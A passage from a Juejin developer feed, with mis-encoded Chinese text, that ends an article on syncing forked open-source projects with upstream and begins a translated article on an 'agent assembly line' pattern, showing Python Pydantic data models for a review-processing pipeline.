<li><strong>RuoYi-Vue-Plus</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fdromara%2FRuoYi-Vue-Plus%25EF%25BC%2588%25E6%258A%2580%25E6%259C%25AF%25E6%25A0%2588%25E5%2585%25A8%25E9%259D%25A2%25EF%25BC%259AVue3%25E3%2580%2581Spring" target="_blank" title="https://gitee.com/dromara/RuoYi-Vue-Plus%EF%BC%88%E6%8A%80%E6%9C%AF%E6%A0%88%E5%85%A8%E9%9D%A2%EF%BC%9AVue3%E3%80%81Spring" ref="nofollow noopener noreferrer">gitee.com/dromara/Ruoâ€¦</a> Boot3ã€Sa-Tokenã€MyBatis-Plus ç­‰ï¼‰</li>
<li><strong>ruoyi-plus-vben5</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fdapppp%2Fruoyi-plus-vben5%25EF%25BC%2588%25E5%259F%25BA%25E4%25BA%258E" target="_blank" title="https://gitee.com/dapppp/ruoyi-plus-vben5%EF%BC%88%E5%9F%BA%E4%BA%8E" ref="nofollow noopener noreferrer">gitee.com/dapppp/ruoyâ€¦</a> Vben5 å’Œ Ant Design Vue çš„å‰ç«¯é¡¹ç›®ï¼‰</li>
</ul>
<h3 data-id="heading-13">æ–¹æ¡ˆé€‚ç”¨æ€§</h3>
<p>å¯¹äºè¿™ç±»<strong>æŠ€æœ¯æ ˆå…¨é¢ã€æ›´æ–°é¢‘ç‡é«˜</strong>çš„å¼€æºé¡¹ç›®ï¼Œé‡‡ç”¨æˆ‘ä»¬çš„æ–¹æ¡ˆï¼ˆFork + ä¸Šæ¸¸ä»“åº“ç®¡ç† + åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥ï¼‰å…·æœ‰æ˜æ˜¾ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>æŠ€æœ¯æ ˆå…¨é¢</strong>ï¼šé¡¹ç›®æ¶‰åŠå¤šä¸ªæŠ€æœ¯ç»„ä»¶ï¼Œæ›´æ–°å¯èƒ½æ¶‰åŠå¤šä¸ªæ¨¡å—ï¼Œé€šè¿‡å•å‘æ•°æ®æµå’Œåˆ†æ”¯éš”ç¦»ï¼Œå¯ä»¥æ¸…æ™°åœ°ç®¡ç†å„æ¨¡å—çš„åŒæ­¥å’Œè‡ªå®šä¹‰ä¿®æ”¹</li>
<li><strong>æ›´æ–°é¢‘ç‡é«˜</strong>ï¼šä¸Šæ¸¸é¡¹ç›®é¢‘ç¹æ›´æ–°æ—¶ï¼Œé€šè¿‡ <code>upstream/main â†’ origin/main â†’ feature/new-function</code> çš„å•å‘åŒæ­¥æµç¨‹ï¼Œå¯ä»¥åŠæ—¶è·å–ä¸Šæ¸¸æ›´æ–°ï¼ŒåŒæ—¶ä¿æŒè‡ªå®šä¹‰ä¿®æ”¹çš„ç‹¬ç«‹æ€§</li>
<li><strong>é¿å…å†²çª</strong>ï¼šé€šè¿‡ä¸¥æ ¼çš„åˆ†æ”¯éš”ç¦»å’Œå®šæœŸåŒæ­¥æœºåˆ¶ï¼Œå‡å°‘ä¸Šæ¸¸æ›´æ–°ä¸è‡ªå®šä¹‰ä¿®æ”¹çš„å†²çªç§¯ç´¯</li>
<li><strong>ç»´æŠ¤æ¸…æ™°</strong>ï¼šåˆ†æ”¯å†å²å¯è¿½æº¯ï¼Œä¾¿äºå®šä½é—®é¢˜å’Œå›æ»šæ“ä½œ</li>
</ul>
<p>å› æ­¤ï¼Œå¯¹äºéœ€è¦åŸºäºæŠ€æœ¯æ ˆå…¨é¢ã€æ›´æ–°é¢‘ç‡é«˜çš„å¼€æºé¡¹ç›®è¿›è¡ŒäºŒæ¬¡å¼€å‘çš„åœºæ™¯ï¼Œæˆ‘ä»¬çš„æ–¹æ¡ˆèƒ½å¤Ÿæœ‰æ•ˆè§£å†³åŒæ­¥æ›´æ–°å’Œè‡ªå®šä¹‰ä¿®æ”¹ç®¡ç†çš„å¹³è¡¡é—®é¢˜ã€‚</p>
<h2 data-id="heading-14">æ€»ç»“</h2>
<p>å¼€æºé¡¹ç›®äºŒæ¬¡å¼€å‘çš„å…³é”®æ˜¯è¦æ—¢èƒ½ä¿æŒä¸ä¸Šæ¸¸çš„åŒæ­¥æ›´æ–°ï¼Œåˆèƒ½ç‹¬ç«‹ç®¡ç†è‡ªå®šä¹‰ä¿®æ”¹ã€‚é€šè¿‡ Fork + ä¸Šæ¸¸ä»“åº“ç®¡ç† + åˆ†æ”¯éš”ç¦»ä¸åŒæ­¥çš„å®Œæ•´æ–¹æ¡ˆï¼Œå¯ä»¥å®ç°ï¼š</p>
<ul>
<li><strong>æ¸…æ™°çš„ä»“åº“å…³ç³»</strong>ï¼šé€šè¿‡ Fork å’Œ upstream è¿œç¨‹é…ç½®ï¼Œæ˜ç¡®ä¸Šæ¸¸å’Œæ´¾ç”Ÿä»“åº“çš„å…³ç³»</li>
<li><strong>æœ‰åºçš„åŒæ­¥æµç¨‹</strong>ï¼šé€šè¿‡å•å‘æ•°æ®æµè§„åˆ™ï¼Œä¿éšœåˆ†æ”¯å†å²å¯è¿½æº¯ï¼Œé¿å…æ··ä¹±</li>
<li><strong>æœ‰æ•ˆçš„å†²çªç®¡ç†</strong>ï¼šé€šè¿‡åˆ†æ”¯éš”ç¦»å’Œå®šæœŸåŒæ­¥ï¼Œå‡å°‘å†²çªç§¯ç´¯</li>
<li><strong>ä¾¿æ·çš„å¯è§†åŒ–ç®¡ç†</strong>ï¼šé€šè¿‡ Sourcetree ç­‰å·¥å…·ï¼Œç®€åŒ–æ“ä½œæµç¨‹</li>
</ul>
<p>å¯¹äºæŠ€æœ¯æ ˆå…¨é¢ã€æ›´æ–°é¢‘ç‡é«˜çš„å¼€æºé¡¹ç›®ï¼Œè¿™ä¸ªæ–¹æ¡ˆèƒ½å¤Ÿæœ‰æ•ˆè§£å†³åŒæ­¥æ›´æ–°å’Œè‡ªå®šä¹‰ä¿®æ”¹ç®¡ç†çš„å¹³è¡¡é—®é¢˜ï¼Œæ˜¯å¼€æºé¡¹ç›®äºŒæ¬¡å¼€å‘çš„æœ€ä½³å®è·µã€‚</p>
<hr/>
<p>å¦‚æœè§‰å¾—è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿ç‚¹èµã€æ”¶è—ã€‚å¦‚æœ‰é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºäº¤æµè®¨è®ºã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ™ºèƒ½ä½“é«˜å¯é è®¾è®¡æ¨¡å¼ï¼šä»£ç†è£…é…çº¿]]></title>    <link>https://juejin.cn/post/7592500570167984163</link>    <guid>https://juejin.cn/post/7592500570167984163</guid>    <pubDate>2026-01-08T06:00:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592500570167984163" data-draft-id="7592524811861704738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ™ºèƒ½ä½“é«˜å¯é è®¾è®¡æ¨¡å¼ï¼šä»£ç†è£…é…çº¿"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T06:00:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿å‡¡"/> <meta itemprop="url" content="https://juejin.cn/user/290747765274222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ™ºèƒ½ä½“é«˜å¯é è®¾è®¡æ¨¡å¼ï¼šä»£ç†è£…é…çº¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/290747765274222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿å‡¡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T06:00:10.000Z" title="Thu Jan 08 2026 06:00:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><em>æœ¬ç³»åˆ—ä»‹ç»å¢å¼ºç°ä»£æ™ºèƒ½ä½“ç³»ç»Ÿå¯é æ€§çš„è®¾è®¡æ¨¡å¼ï¼Œä»¥ç›´è§‚æ–¹å¼é€ä¸€ä»‹ç»æ¯ä¸ªæ¦‚å¿µï¼Œæ‹†è§£å…¶ç›®çš„ï¼Œç„¶åå®ç°ç®€å•å¯è¡Œçš„ç‰ˆæœ¬ï¼Œæ¼”ç¤ºå…¶å¦‚ä½•èå…¥ç°å®ä¸–ç•Œçš„æ™ºèƒ½ä½“ç³»ç»Ÿã€‚æœ¬ç³»åˆ—ä¸€å…± 14 ç¯‡æ–‡ç« ï¼Œè¿™æ˜¯ç¬¬ 7 ç¯‡ã€‚åŸæ–‡ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flevelup.gitconnected.com%2Fbuilding-the-14-key-pillars-of-agentic-ai-229e50f65986" title="https://levelup.gitconnected.com/building-the-14-key-pillars-of-agentic-ai-229e50f65986" target="_blank" ref="nofollow noopener noreferrer">Building the 14 Key Pillars of Agentic AI</a></em></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc6eaaa77642446e9f0d7d67c5e44081~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768456810&amp;x-signature=ZkpFf4r3UPlfujXsMFPlQnXsiwQ%3D" alt="" loading="lazy"/></p>
<p>ä¼˜åŒ–æ™ºèƒ½ä½“è§£å†³æ–¹æ¡ˆéœ€è¦è½¯ä»¶å·¥ç¨‹ç¡®ä¿ç»„ä»¶åè°ƒã€å¹¶è¡Œè¿è¡Œå¹¶ä¸ç³»ç»Ÿé«˜æ•ˆäº¤äº’ã€‚ä¾‹å¦‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FSpeculative_execution" title="https://en.wikipedia.org/wiki/Speculative_execution" target="_blank" ref="nofollow noopener noreferrer">é¢„æµ‹æ‰§è¡Œ</a>ï¼Œä¼šå°è¯•å¤„ç†å¯é¢„æµ‹æŸ¥è¯¢ä»¥<strong>é™ä½æ—¶å»¶</strong>ï¼Œæˆ–è€…è¿›è¡Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.arm.com%2Fcommunity%2Farm-community-blogs%2Fb%2Fembedded-and-microcontrollers-blog%2Fposts%2Fcomparing-lock-step-redundant-execution-versus-split-lock-technologies" title="https://developer.arm.com/community/arm-community-blogs/b/embedded-and-microcontrollers-blog/posts/comparing-lock-step-redundant-execution-versus-split-lock-technologies" target="_blank" ref="nofollow noopener noreferrer">å†—ä½™æ‰§è¡Œ</a>ï¼Œå³<strong>å¯¹åŒä¸€æ™ºèƒ½ä½“é‡å¤æ‰§è¡Œå¤šæ¬¡</strong>ä»¥é˜²å•ç‚¹æ•…éšœã€‚å…¶ä»–å¢å¼ºç°ä»£æ™ºèƒ½ä½“ç³»ç»Ÿå¯é æ€§çš„æ¨¡å¼åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>å¹¶è¡Œå·¥å…·</strong>ï¼šæ™ºèƒ½ä½“åŒæ—¶æ‰§è¡Œç‹¬ç«‹ API è°ƒç”¨ä»¥éšè— I/O æ—¶å»¶ã€‚</li>
<li><strong>å±‚çº§æ™ºèƒ½ä½“</strong>ï¼šç®¡ç†è€…å°†ä»»åŠ¡æ‹†åˆ†ä¸ºç”±æ‰§è¡Œæ™ºèƒ½ä½“å¤„ç†çš„å°æ­¥éª¤ã€‚</li>
<li><strong>ç«äº‰æ€§æ™ºèƒ½ä½“ç»„åˆ</strong>ï¼šå¤šä¸ªæ™ºèƒ½ä½“æå‡ºç­”æ¡ˆï¼Œç³»ç»Ÿé€‰å‡ºæœ€ä½³ã€‚</li>
<li><strong>å†—ä½™æ‰§è¡Œ</strong>ï¼šå³ä¸¤ä¸ªæˆ–å¤šä¸ªæ™ºèƒ½ä½“è§£å†³åŒä¸€ä»»åŠ¡ä»¥æ£€æµ‹é”™è¯¯å¹¶æé«˜å¯é æ€§ã€‚</li>
<li><strong>å¹¶è¡Œæ£€ç´¢å’Œæ··åˆæ£€ç´¢</strong>ï¼šå¤šç§æ£€ç´¢ç­–ç•¥ååŒè¿è¡Œä»¥æå‡ä¸Šä¸‹æ–‡è´¨é‡ã€‚</li>
<li><strong>å¤šè·³æ£€ç´¢</strong>ï¼šæ™ºèƒ½ä½“é€šè¿‡è¿­ä»£æ£€ç´¢æ­¥éª¤æ”¶é›†æ›´æ·±å…¥ã€æ›´ç›¸å…³çš„ä¿¡æ¯ã€‚</li>
</ul>
<p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–æ¨¡å¼ã€‚</p>
<p>æœ¬ç³»åˆ—å°†å®ç°æœ€å¸¸ç”¨æ™ºèƒ½ä½“æ¨¡å¼èƒŒåçš„åŸºç¡€æ¦‚å¿µï¼Œä»¥ç›´è§‚æ–¹å¼é€ä¸€ä»‹ç»æ¯ä¸ªæ¦‚å¿µï¼Œæ‹†è§£å…¶ç›®çš„ï¼Œç„¶åå®ç°ç®€å•å¯è¡Œçš„ç‰ˆæœ¬ï¼Œæ¼”ç¤ºå…¶å¦‚ä½•èå…¥ç°å®ä¸–ç•Œçš„æ™ºèƒ½ä½“ç³»ç»Ÿã€‚</p>
<p>æ‰€æœ‰ç†è®ºå’Œä»£ç éƒ½åœ¨ GitHub ä»“åº“é‡Œï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFareedKhan-dev%2Fagentic-parallelism" title="https://github.com/FareedKhan-dev/agentic-parallelism" target="_blank" ref="nofollow noopener noreferrer">ğŸ¤– Agentic Parallelism: A Practical Guide ğŸš€</a></p>
<p>ä»£ç åº“ç»„ç»‡å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-erlang" lang="erlang">agentic-parallelism/
    â”œâ”€â”€ <span class="hljs-number">01</span>_parallel_tool_use.ipynb
    â”œâ”€â”€ <span class="hljs-number">02</span>_parallel_hypothesis.ipynb
    ...
    â”œâ”€â”€ <span class="hljs-number">06</span>_competitive_agent_ensembles.ipynb
    â”œâ”€â”€ <span class="hljs-number">07</span>_agent_assembly_line.ipynb
    â”œâ”€â”€ <span class="hljs-number">08</span>_decentralized_blackboard.ipynb
    ...
    â”œâ”€â”€ <span class="hljs-number">13</span>_parallel_context_preprocessing.ipynb
    â””â”€â”€ <span class="hljs-number">14</span>_parallel_multi_hop_retrieval.ipynb
</code></pre>
<hr/>
<h2 data-id="heading-0">æ”¯æŒå¤§ååé‡çš„ä»£ç†è£…é…çº¿</h2>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬æ¢ç´¢çš„å¹¶è¡Œæ¨¡å¼ï¼ˆä¾‹å¦‚å¹¶è¡Œè°ƒç”¨å·¥å…·ã€å‡è®¾ç”Ÿæˆå’Œè¯„ä¼°ï¼‰éƒ½ä¸“æ³¨äºå‡å°‘å•ä¸ªå¤æ‚ä»»åŠ¡çš„æ—¶å»¶ï¼Œä½¿ä»£ç†å¯¹äºå•ä¸ªç”¨æˆ·æŸ¥è¯¢æ›´å¿«ã€æ›´æ™ºèƒ½ã€‚</p>
<p>ä½†å¦‚æœæŒ‘æˆ˜ä¸æ˜¯ä¸€é¡¹ä»»åŠ¡çš„å¤æ‚æ€§ï¼Œè€Œæ˜¯ä¸€ç³»åˆ—æ•°é‡åºå¤§çš„è¿ç»­ä»»åŠ¡ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<p>å¯¹äºè®¸å¤šç”Ÿäº§åº”ç”¨æ¥è¯´ï¼Œæœ€å…³é”®æŒ‡æ ‡ä¸æ˜¯å•æ¬¡å¤„ç†çš„é€Ÿåº¦ï¼Œè€Œæ˜¯æ¯å°æ—¶å¯ä»¥å¤„ç†å¤šå°‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fe053bc0be94054a9a46249eeb200d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-e5Yeh:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768456810&amp;x-signature=1cf%2B2Iq6MLg5xFCPudXhQlpMuS8%3D" alt="ä»£ç†è£…é…çº¿" loading="lazy"/></p>
<p>è¿™å°±æ˜¯ <strong>ä»£ç†è£…é…çº¿ï¼ˆAgent Assembly Lineï¼‰</strong> æ¶æ„ä¹‹æ‰€ä»¥é‡è¦çš„åŸå› ï¼Œè¿™ç§æ¨¡å¼å°†é‡ç‚¹ä»æœ€å°åŒ–æ—¶å»¶è½¬ç§»åˆ°æœ€å¤§åŒ–ååé‡ã€‚</p>
<p>ä¸éœ€è¦ä¸€ä¸ªä»£ç†ä»å¤´åˆ°å°¾é€ä¸€å¤„ç†ï¼Œè€Œæ˜¯å°†æµç¨‹åˆ†è§£ä¸ºä¸€ç³»åˆ—å¤„ç†ä¸“é—¨å·¥ä½œçš„å·¥ä½œç«™ã€‚ä¸€æ—¦æŸä¸€å·¥ä½œç«™å®Œæˆï¼Œå°±å°†é¡¹ç›®ä¼ é€’ç»™ä¸‹ä¸€ç«™ã€‚æ‰€æœ‰å·¥ä½œç«™å¹¶è¡Œå·¥ä½œï¼Œå¤„ç†æµä¸­çš„ä¸åŒé¡¹ç›®ã€‚</p>
<p>æˆ‘ä»¬å°†å»ºç«‹ä¸€ä¸ªä¸‰é˜¶æ®µæµæ°´çº¿æ¥å¤„ç†ä¸€æ‰¹äº§å“è¯„è®ºï¼Œç›®æ ‡æ˜¯é€šè¿‡ä»”ç»†çš„æ—¶åºåˆ†ææ¥è¯æ˜ï¼Œä¸ä¼ ç»Ÿé¡ºåºæ–¹æ³•ç›¸æ¯”ï¼Œè¿™ç§å¹¶è¡Œæµæ°´çº¿å¯ä»¥æ˜¾ç€å¢åŠ æ¯ç§’å¤„ç†çš„è¯„è®ºæ•°é‡ã€‚</p>
<p>é¦–å…ˆå®šä¹‰ä»£è¡¨è¯„è®ºçš„æ•°æ®ç»“æ„ï¼Œè¯¥ç»“æ„å¯ä»¥åœ¨è£…é…çº¿ä¸Šç§»åŠ¨ï¼Œæ¯ä¸ªå·¥ä½œç«™éƒ½ä¼šé€æ¸ä¸°å¯Œå…¶å†…å®¹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.pydantic_v1 <span class="hljs-keyword">import</span> BaseModel, Field
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Literal</span>, <span class="hljs-type">Optional</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">TriageResult</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""åˆå§‹åˆ†æµç«™çš„ç»“æ„åŒ–è¾“å‡º"""</span>
    category: <span class="hljs-type">Literal</span>[<span class="hljs-string">"Feedback"</span>, <span class="hljs-string">"Bug Report"</span>, <span class="hljs-string">"Support Request"</span>, <span class="hljs-string">"Irrelevant"</span>] = Field(description=<span class="hljs-string">"The category of the review."</span>)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Summary</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""æ‘˜è¦ç«™çš„ç»“æ„åŒ–è¾“å‡º"""</span>
    summary: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"A one-sentence summary of the key feedback in the review."</span>)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ExtractedData</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""æ•°æ®æå–ç«™çš„ç»“æ„åŒ–è¾“å‡º"""</span>
    product_mentioned: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"The specific product the review is about."</span>)
    sentiment: <span class="hljs-type">Literal</span>[<span class="hljs-string">"Positive"</span>, <span class="hljs-string">"Negative"</span>, <span class="hljs-string">"Neutral"</span>] = Field(description=<span class="hljs-string">"The overall sentiment of the review."</span>)
    key_feature: <span class="hljs-built_in">str</span> = Field(description=<span class="hljs-string">"The main feature or aspect discussed in the review."</span>)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessedReview</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-string">"""ç´¯ç§¯æ‰€æœ‰ç«™ç‚¹æ•°æ®çš„æœ€ç»ˆçš„ã€ç»è¿‡å®Œå…¨å¤„ç†çš„è¯„è®ºå¯¹è±¡"""</span>
    original_review: <span class="hljs-built_in">str</span>
    category: <span class="hljs-built_in">str</span>
    summary: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span>
    extracted_data: <span class="hljs-type">Optional</span>[ExtractedData] = <span class="hljs-literal">None</span>
</code></pre>
<p>è¿™äº› Pydantic æ¨¡ç‰ˆæ˜¯è£…é…çº¿çš„â€œæ ‡å‡†åŒ–è¿è¾“é›†è£…ç®±â€ï¼Œ<code>ProcessedReview</code> å¯¹è±¡æ˜¯ä¸­å¤®æ•°æ®è½½ä½“,åœ¨ç¬¬ä¸€ä¸ªç«™ï¼ˆ<code>Triage</code>ï¼‰åˆ›å»ºï¼Œç„¶åéšç€ç§»åŠ¨åˆ°åç»­ç«™ï¼ˆ<code>summary</code>ã€<code>extracted_data</code>ï¼‰è€Œé€æ¸ä¸°å¯Œï¼Œç¡®ä¿æµæ°´çº¿æ¯ä¸ªé˜¶æ®µçš„æ•°æ®å¥‘çº¦ä¸€è‡´ã€‚</p>
<p>æ¥ä¸‹æ¥å®šä¹‰ <code>GraphState</code>ï¼Œå¯¹ä¸€æ‰¹è¯„è®ºè¿›è¡Œæ“ä½œã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> TypedDict, Annotated, <span class="hljs-type">List</span>
<span class="hljs-keyword">import</span> operator

<span class="hljs-keyword">class</span> <span class="hljs-title class_">PipelineState</span>(<span class="hljs-title class_ inherited__">TypedDict</span>):
    <span class="hljs-comment"># 'initial_reviews' ä¿å­˜ä¼ å…¥çš„åŸå§‹è¯„è®ºå­—ç¬¦ä¸²</span>
    initial_reviews: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>]
    <span class="hljs-comment"># 'processed_reviews' æ˜¯ProcessedReviewå¯¹è±¡åˆ—è¡¨ï¼Œè¿™äº›å¯¹è±¡æ˜¯åœ¨é€šè¿‡æµæ°´çº¿ç§»åŠ¨æ—¶æ„å»ºçš„</span>
    processed_reviews: <span class="hljs-type">List</span>[ProcessedReview]
    performance_log: Annotated[<span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>], operator.add]
</code></pre>
<p><code>PipelineState</code> æ˜¯ä¸ºæ‰¹å¤„ç†è€Œè®¾è®¡çš„ï¼Œæ•´ä¸ªè£…é…çº¿å°†ä½¿ç”¨ <code>initial_reviews</code> åˆ—è¡¨è°ƒç”¨ä¸€æ¬¡ï¼Œå…¶æœ€ç»ˆè¾“å‡ºå°†æ˜¯å®Œæ•´çš„ <code>processed_reviews</code> åˆ—è¡¨ã€‚</p>
